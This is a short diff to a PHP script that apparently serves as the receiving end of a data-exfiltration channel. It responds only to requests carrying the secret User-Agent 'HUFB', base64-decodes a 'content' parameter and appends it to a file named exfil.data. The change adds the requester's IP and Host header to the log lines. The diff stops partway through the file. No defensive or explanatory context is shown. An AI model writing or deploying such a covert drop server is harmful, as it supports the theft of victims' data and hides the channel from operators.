@@ -1,13 +1,14 @@
 <?php
 
 $user_agent = $_SERVER['HTTP_USER_AGENT'];
+$source = $_SERVER['REMOTE_ADDR'];
+$host = $_SERVER['HTTP_HOST'];
 if ($user_agent == 'HUFB') {
 	$content = $_GET['content'];
 	$file = '/home/ubuntu/data/exfil.data';
 	$saved_file = fopen($file, 'a');
 	$decoded = base64_decode($content);
-	$source = $_SERVER['REMOTE_ADDR'];
-	$begin = $source . ' - Capturing';
+	$begin = $source . ' : ' . $host . ' - Capturing';
 	$end = $source . ' - Finished';
 	fwrite($saved_file, $begin);
 	fwrite($saved_file, "\n");
